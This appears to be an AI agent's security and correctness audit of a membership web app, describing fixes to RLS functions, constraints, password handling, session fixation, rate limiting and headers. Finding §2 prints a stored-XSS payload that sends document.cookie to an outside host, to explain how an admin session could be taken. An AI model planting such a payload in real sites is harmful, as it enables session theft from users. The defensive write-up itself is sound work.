# Sakred Body — whole-app audit

**8 August 2026.** Everything below was checked against the running system —
the live database at `zcvanbozvtojmnyuzsjh`, a real build, a real typecheck —
rather than read off the source and assumed.

> **Two passes.** The first covered correctness and access control: route
> guards, RLS, migrations, tests, build. Asked whether that was really a
> senior-level review, the honest answer was no — it was about half of one. It
> never looked at transaction boundaries, session handling, brute force,
> foreign key indexes, security headers, dependencies, or what happens when
> the client throws. The second pass did, and is in **§ Second pass** below.
> It found seven more, two of them serious.
>
> What **still** hasn't been audited is listed at the end, under
> *[Not audited](#not-audited)*. That list is part of the report.

---

## Verdict

The machinery is sound and the app is empty. Those are two separate problems
and only one of them is mine.

Every route is guarded, every table is policed, the engine's timezone bug is
gone, and 214 assertions pass. But there are **zero protocols, zero habits,
zero products and zero ebooks** in the database, and **no member can see the
community** because nobody has been assigned a membership tier. A paying
client logging in today would find a beautiful, correct, empty room.

### The auth check was a false alarm first time

An initial scan reported 26 admin routes guarded only by `isAuthenticated` —
which would have been a straight privilege escalation, any logged-in member
able to read every coaching conversation. It was wrong: the scanner captured
only the first middleware, and the real pattern is `isAuthenticated, isAdmin`
chained. Re-run capturing the whole chain, **every admin route has `isAdmin`**.

The one exception is deliberate: `GET /api/admin/check` is member-level,
because its entire job is to tell you whether *you* are an admin.

## Defects found and fixed

### 1. `replyCount` was never incremented — *fixed*

`community_messages.reply_count` is documented as "denormalised so a thread
list doesn't need a count per row". Nothing anywhere incremented it. Every
thread in the room would have read **0 replies** forever, and the affordance
to open a thread — which is gated on `replyCount > 0` — would never have
appeared. The community would have looked like it had no conversations in it.

Fixed with a recursive CTE that walks the parent chain and bumps every
ancestor, not just the root: the channel list reads the root's count and a
collapsed reply reads its own. Bounded by `MAX_THREAD_DEPTH` (8), so it is at
most eight rows in one round trip. The CTE was executed against the live
database to confirm it parses and terminates.

### 2. Search results were a stored XSS — *fixed before it shipped*

I had written the search snippet through `dangerouslySetInnerHTML`, because
`ts_headline` returns `<b>` around matched terms.

`ts_headline` wraps the matches. It does **not** escape the text around them —
it returns whatever was stored. So any member could post

```
<img src=x onerror="fetch('https://…/?c='+document.cookie)">
```

and wait for an admin to search the community. Admin session, taken.

Rewritten so no HTML is produced at all: the delimiters are private-use
codepoints (U+E000/E001), the server splits on them into `{ text, match }`
segments, and the client renders text nodes. The delimiters and the splitter
live together in `shared/utils/highlight.ts` so they cannot drift apart, and
the tests pin the property rather than the string shape — *no delimiter ever
survives into the output, and markup stays inert*.

### 3. A hook after an early return — *fixed*

I added the unread-notes query to `AdminPortal` below three early returns.
React would have thrown *"Rendered more hooks than during the previous
render"* the moment the admin check resolved — a white screen on the admin
portal, every time. Moved up with the other queries.

I then scanned all 84 client components for the same shape. **One other
instance exists**, in `AdminDashboard.tsx` — but that file is dead (below).

### 4. Habit identity was keyed on the title — *fixed*

Found by checking the other dev's **Runtime Wiring & Integrity Spec** (Rule #7,
the rename rule) against this engine rather than assuming it only described
the Expo app. It described this one too.

`uq_habits_user_title_date` made `(user_id, title, scheduled_date)` unique, and
the materialiser's `ON CONFLICT DO NOTHING` leaned on it. That made
`routine_habits.title` a primary key in disguise. Renaming a template would
have inserted a **parallel series** for the same days — the member sees the
habit twice, one copy possibly completed, the day can never read as fully
done, **and the streak breaks** from an edit nobody thought was destructive.

Every habit row already carried `routine_habit_id`; it just wasn't what
uniqueness keyed on. `supabase/habit-identity.sql`:

- `uq_habits_user_template_date` on `(user_id, routine_habit_id, scheduled_date)`
  `WHERE routine_habit_id IS NOT NULL` — routine and standalone habits
- `uq_habits_user_title_date` narrowed to `WHERE routine_habit_id IS NULL` —
  custom habits, the only ones a member named themselves
- `habits.routine_habit_id` gained a real FK, `ON DELETE SET NULL` — it had
  **no FK at all**, so ids could dangle. `SET NULL` and never `CASCADE`:
  deleting a template must not erase completion history, which would also
  retroactively turn failed days into perfect ones.

Run against the live database while `habits` had **0 rows**, so no row could
violate either index and the FK couldn't fail validation. Verified after by
reading back `pg_indexes` and `pg_constraint`, not by trusting the response.

One deliberate behaviour change: two *different* templates sharing a title, on
the same day, used to collapse into one row. They will now both appear. A
visible duplicate is an admin content mistake someone can see and fix; a
silently swallowed habit is one nobody ever learns about.

### 5. Two components both called `TodayTab` — *fixed*

The Today screen I built last session was never reachable. `MemberDashboard`
already imported a different `TodayTab` from `CoachingDashboard` — the habits
checklist — and rendered that.

They were never alternatives. Resolved by making them one screen in the order
the day actually happens: the note and the sky it was written from, then the
member's intention, then the day's habits. Mine is now `DailyRitual`.

## Second pass — the parts the first pass never looked at

The first pass asked "is it correct and is it locked". This one asked the
questions that stay quiet until the day they don't: what happens under
concurrency, under a partial failure, under someone deliberately trying.

### 6. `can_see_channel` still pointed at a table that no longer existed — *fixed*

Renaming `cohorts` to `offerings` rewrote the RLS **policies** automatically,
because Postgres stores a policy as a parsed tree and rewrites it along with
the rename. It does not do this for **function bodies**, which are stored as
text. `can_see_channel` still referenced `c.cohort_id` and `cohort_members`,
so every channel permission check would have thrown *relation does not exist*
— the entire community, dead, for everyone.

The migration reported success. Nothing in the schema looked wrong. Found by
calling the function rather than reading it.

### 7. Two CHECK constraints outlived the columns they described — *fixed*

`cohorts_kind_chk` predated the generalisation and still allowed only the
original kinds, so **inserting a `talk` failed** — the exact thing the
offerings work existed to enable. The registration status check had no
`waitlist` value, so the waitlist could never be written to.

Both found by smoke-testing an insert of each new kind, not by reading the
schema. A CHECK constraint is invisible in every schema view you'd normally
look at.

### 8. `uq_wins` would have re-awarded the same win forever — *fixed*

Postgres treats `NULL`s as **distinct** in a unique index. `first_step` has a
null `subject_id`, so `(user_id, kind, subject_id)` never collided with
itself, and *every habit toggle for the rest of that member's life* would have
awarded another "The first one" — a modal interrupting them each time.

Fixed with `NULLS NOT DISTINCT` (PG15+; this is on 17.6). Found by inserting
the same win three times and counting the rows, which is the only way this
shows up — the index exists and looks correct in `pg_indexes` either way.

### 9. Sharing a win used a third copy of the visibility rule — *fixed*

The community module's own header warns that the tier rule is written twice,
once in TypeScript and once in SQL, and that this is a risk. My win-share
endpoint made it three, and the third copy dropped the admin bypass — so
**nobody could share a win, including the admin**, which is every account that
can currently see a room at all.

Found by asking the database which channel each of the four real users would
post into. All four answered null. `visibleChannelIds` is now exported from
`server/community/index.ts` and is the single implementation.

### 10. A malformed password hash killed the whole server — *fixed*

The worst thing found in either pass.

`verifyPassword` passed `stored.split(":")` straight into `Buffer.from(key,
"hex")` and then `crypto.timingSafeEqual`. Given any stored value that isn't
`salt:key` — a bcrypt hash, an imported row, a seeded account —
`Buffer.from` throws.

It throws **inside scrypt's callback**, not the Promise executor. So it is not
a rejected promise: no `.catch()` can see it, and neither can the route's
`try/catch`. It is an `uncaughtException`, and it takes the process down.
Confirmed by running the original function against a bcrypt-shaped string —
the process died rather than returning false.

Latent today: exactly one account has a password and its hash is well formed.
It goes live the first time anyone imports or seeds a user, which is precisely
the kind of thing done in a hurry, in production, by someone who has no reason
to think it could matter.

Fixed by validating the format before anything can throw. A hash we don't
recognise is now a failed login. `Buffer.from(…, "hex")` does not throw on bad
hex — it silently truncates — so the length check has to come *after* the
conversion, which is the part that is easy to get subtly wrong.

The hashing now lives in `server/auth/password.ts` with no database import.
That is the actual root cause: importing it used to open a Postgres pool, so
it could not be tested without a connection string, so it was never tested.

### 11. Logging in did not change the session id — *fixed*

`req.session.userId = user.id` promoted whatever session the browser arrived
with. An attacker who could plant a session cookie on someone kept a valid
authenticated session once that person logged in. Now `regenerate()` then an
explicit `save()`, on register too, since registering also authenticates.

### 12. Nothing limited password guessing — *fixed*

`/api/login` had no rate limit of any kind. Any address could guess at network
speed, and each guess cost us an scrypt and cost the attacker nothing. For a
membership whose clients' email addresses are publicly guessable, this was the
cheapest attack available against the app.

Counted in Postgres, not in memory. The usual answer — `express-rate-limit` —
counts per process, and this runs on Vercel Functions where several instances
serve login at once and none share memory; the real limit would have been
"five attempts times however many instances happen to exist", which is not a
limit.

Counted per email **and** per IP independently, because email alone lets a
botnet hammer one account from many addresses and IP alone punishes everyone
behind one office NAT. The increment happens inside the `ON CONFLICT DO
UPDATE`, so parallel guesses can't race the counter — read-then-write in
TypeScript would let two simultaneous attempts both read 4 and both write 5.

Verified against the live database, with the statement parameterised the way
the driver actually sends it: locks at exactly the fifth failure, not the
fourth or the sixth.

Also closed here: the timing side-channel that let anyone sort a list of email
addresses into members and non-members, since "no such account" returned in a
millisecond and "wrong password" took an scrypt.

### 13. Eleven foreign keys had no index — *fixed*

Postgres indexes the *referenced* side of a foreign key automatically and
never the *referencing* side, and nothing warns you. Deleting one row from a
parent means proving no child points at it — a sequential scan of the whole
child table, per row, while holding a lock.

The two that would have bitten first: `users.membership_tier`, so any change
to a tier scans every user; and `habits.routine_habit_id`, the link added in
§4 to survive template renames, which is followed on every template edit.

Found by asking `pg_constraint` which foreign keys had no index with a
matching leading column. Now zero.

### 14. Sharing a win was three writes with no transaction — *fixed*

Insert the message, set its `root_id`, mark the win shared. A failure between
them left the worst possible shape: a message with a null `root_id`, which the
channel list filters on and so renders nowhere, plus a win still marked
unshared. The member sees an error, tries again, and makes a second invisible
post. Nothing cleans up either. Now one transaction.

**Eleven other multi-write handlers still have no transaction**, listed under
*[Not fixed](#smaller-things-not-fixed)*. The habit toggle is the one worth
doing next, because it both writes a completion and awards a win.

### 15. No security headers at all — *fixed*

Not a weakened set. None: no CSP, no `X-Frame-Options`, no `nosniff`, no HSTS.
The portal could be loaded in an invisible iframe on someone else's page and
clicked through by a member who thought they were clicking something else, and
any injected script had the entire origin to work with.

Written by hand rather than with `helmet`, whose defaults would need
half-disabling to let Google Fonts load — a policy assembled by switching off
parts of someone else's is harder to read than the eight lines it replaces.

`style-src` must allow `'unsafe-inline'`: Framer Motion animates by writing
inline styles every frame and Radix positions overlays the same way, and a
nonce cannot cover styles written by JS after load. `script-src` stays strict
at `'self'`, which is the directive that actually stops XSS — checked against
the built `index.html` for inline `<script>` blocks first, because Vite's
module-preload polyfill is inline in some configurations and a CSP that
white-screens every page is a CSP that gets deleted.

### 16. A render error took the whole app to a blank screen — *fixed*

There was no error boundary anywhere. React unmounts the entire tree when a
render throws, so one null where a string was expected took a member from
their morning ritual to a white page — on a phone, with no console and no
obvious way to reload, indistinguishable from the app being broken for good.
There was also no record it had happened: no log, no event. The only way we'd
have learned about one is a member mentioning it.

## Open — needs you, not me

### A. No member can see the community

All four users are on tier `free` (rank 0). Every channel requires rank ≥ 10:

| room | requires |
|---|---|
| The Room (`general`) | Member (10) |
| Protocols | Member (10) |
| Inner | Inner Circle (20) |

Admins bypass the gate, so **you** will see all three. Everyone else gets
"No rooms are open to you yet."

Two ways to fix, and it's a product call, not a bug:

- open the general room to everyone — set `min_tier_rank` to 0 in **Admin →
  Rooms**; or
- assign real tiers to real members, and leave the room paid.

The second is probably what you want. But right now it's neither, so the
community is invisible.

## Smaller things, not fixed

- **Bundle**: the main chunk is 542 kB (171 kB gzipped). Fine over wifi, less
  fine as the first thing a phone downloads. The portal is already split out;
  it's the marketing pages plus framer-motion that dominate.
- **Eleven multi-write handlers still have no transaction.** `POST
  /api/catalog/assign` does four writes, the habit toggle three. The toggle is
  the one to do next: it writes a completion *and* awards a win, so a failure
  between them means a member's streak and their wins disagree. Listed in
  full by the scan in §14.
- **`POST /api/executive-applications` is public and unrated.** Correct that
  it's public — it's the application form. The login throttle added in §12 is
  login-only; the same table would serve this endpoint with a few lines, and
  should, before the site gets real traffic.
- **`scrypt` runs at Node's defaults** (N=16384, r=8, p=1). Not weak, but
  below what's now recommended for a password hash, and worth raising with a
  rehash-on-next-login path. Deliberately left alone in the auth pass: it is a
  different change from fixing a crash, and mixing them makes both harder to
  reason about.
- **58 collection endpoints have no `LIMIT`.** Most read catalogues that will
  never be large. The five that will grow without bound are the coaching
  message threads, `/api/wins`, `/api/habits/range` and the community thread
  read — those want pagination before a member has a year of history.
- **Every user's timezone is `UTC`.** The sync writes on dashboard load and
  none of these four accounts has loaded it since the feature shipped. It
  will self-correct on first login. Worth re-checking once there are real
  members, because the whole day-boundary fix depends on it.
- **The cron is registered but has never run** — `vercel.json` declares it
  hourly, and crons only register on a production deploy. It will start on
  the next one.

## Mobile

`viewport-fit=cover` and a web manifest were added, so **Add to Home Screen**
now opens the portal standalone at `/member`, dark, with no browser chrome.
That is the fastest honest way to look at this on a phone today.

`maximum-scale=1` was removed from the viewport tag. It blocked pinch-zoom,
which iOS has ignored since iOS 10 and which on Android just stops people
enlarging text they can't read. Flagging it because that tag is shared with
the landing page.

### TestFlight — the straight answer

**This repo cannot go to TestFlight today, and not because of anything
missing.** TestFlight distributes a signed `.ipa`. This is a Vite/React web
app served by Express on Vercel; there is no Xcode project to archive.

Three routes, honestly ranked:

1. **Add to Home Screen — works right now, today.** Deploy, open the URL on
   your phone, Share → Add to Home Screen. Full screen, own icon, own splash.
   No Apple account, no review, no build. It is not TestFlight and you can't
   hand it to a tester through TestFlight, but for *"see what it looks like
   and start editing the mobile version"* it is the same afternoon and none
   of the friction.

2. **Capacitor wrapper — genuinely same-day, with conditions.** Wrap the web
   app in a native shell pointed at the live URL. Xcode 26.3 is installed;
   **CocoaPods is not** and would need installing. You'd need a new bundle id
   (e.g. `com.sakredunion.body`) and a new App Store Connect record — Sakred
   Body must not reuse `com.sakredunion.app`, which is Sakred Health.
   You already have the Apple team (`35J234DF62`), so signing is solved.
   TestFlight *internal* testing skips Beta App Review, so a build is usable
   within roughly half an hour of upload.
   The catch worth stating plainly: a pure webview wrapper is what App Store
   guideline 4.2 exists to reject. Fine for internal TestFlight, not a path
   to the App Store.

3. **Port to Expo — weeks, not hours.** `sakredportal` is already Expo and
   already ships (v1.4.24, build 142). But this codebase is DOM, Tailwind and
   Canvas 2D; the gem renderer alone is 417 lines of canvas. That is a
   rewrite, not a port.

My recommendation: **(1) today**, so you can look at it on the treadmill; and
decide on (2) once there's content in the database worth putting in front of
a tester. Shipping an empty app to TestFlight mostly buys you a TestFlight
build of an empty app.

## The other dev's integrity spec, checked against this app

Their `Runtime Wiring & Integrity Spec` describes the Expo app, but most of it
is about a shape both apps share. Checked each load-bearing rule here:

| their rule | Sakred Body |
|---|---|
| #7 rename trap — dedup on ids, not `title` | **was broken, now fixed** (§4) |
| #8 `routine_habit_id ON DELETE SET NULL` | **was missing entirely, now added** (§4) |
| #6 unique constraint + `ON CONFLICT DO NOTHING` | already in place; now on the right key |
| #14 one active routine per user | already enforced — `uq_user_routines_one_active`, plus `…_one_scheduled` |
| #10 never `new Date('YYYY-MM-DD')` | server uses `todayInZone` / `addDaysToString` throughout; client date helpers run in the browser, where local *is* the member's timezone |
| #11 one materialiser | **already true here** — one `materialise()` on the server. No client-side generator exists to drift from it, which is the whole class of bug they document in §8 |
| #4 unconditional refresh | React Query owns this; no count-gated `setState` anywhere |
| #1 no global store / instance explosion | not applicable — React Query is the shared cache, so there is no nested-hook duplication |
| #12 server-side entitlement gate | **open** — see below |
| #15 no empty catches | mostly clean; `afterResponse` swallows deliberately and logs |

Two of their rules remain genuinely open here:

- **#12, the gate.** Enrollment does not check an entitlement server-side.
  It matters less right now because nothing is sold through the app yet, but
  the moment a protocol is paid, the check belongs in the enrollment path and
  not in a screen.
- **#6.3, missing FKs.** `user_removed_habits` and `user_routines` have no FK
  to `users`, so deleting a member orphans rows. Low urgency at four users,
  worth doing before there are real ones.

Their §12 point about instrumentation applied here too, and no longer does.
**It has since been built** — one `events` table, a closed list of event
names, recording through a helper that writes after the response so it can
never block or break a request, and an admin dashboard that answers the three
questions in the order they matter: is anyone clicking the buy links, is the
daily loop being used, and what failed quietly. `error.client` and
`error.server` are in that list, so a crash is now a row rather than a rumour.

## Not audited

This belongs in the report as much as the findings do. Two passes covered a
lot and left this uncovered — none of it is known to be broken, and none of it
is known to be fine either.

| area | why it matters |
|---|---|
| **Nothing is tested through a route** | All 214 assertions are pure functions. No test ever starts the app, opens a session, or calls an endpoint. Every access-control claim in this document comes from reading code and querying the database, not from a test that would fail if someone removed a guard tomorrow. This is the largest single gap. |
| **The client, at all** | No render tests, no accessibility pass, no keyboard navigation, no screen-reader check. The mobile work was design and touch targets, not assistive technology. |
| **Concurrency beyond the login counter** | Two devices toggling the same habit, two admins editing one offering, a registration landing as the last seat is taken. The capacity check was smoke-tested serially; it has never been raced. |
| **The AI path under failure** | What a member sees when Bedrock is slow, rate-limited, or returns something unusable. The non-blocking read path exists; it has not been exercised against a real outage. |
| **Anything under load** | No load test, no query plans read, no slow-query log. The unindexed foreign keys were found in the catalogue, not by watching something be slow. |
| **Session store lifecycle** | `connect-pg-simple` with `createTableIfMissing`. Nothing checked that expired sessions are actually reaped, or how large that table gets. |
| **The Vercel function's real limits** | `maxDuration: 30` with one generation measured at 25.5s. That margin has never been tested with several members crossing midnight at once. |
| **Supabase storage** | Bucket policies on uploaded images were never read. |

## Process

`git add -A` has now mixed two sessions' work three times — twice mine
(`30d163e`, `b6a049b`), once the other dev's (`5eb89ea`, which swept in the
entire community UI, both admin surfaces and the highlight module). Nothing
has ever been lost and the author identity is identical either way, so none of
it is worth rewriting, and `5eb89ea` is already pushed.

But path-scoped staging on one side clearly doesn't prevent it, because it
only takes one side to run `git add -A`. Two `git worktree` checkouts off the
same repo would end it permanently.
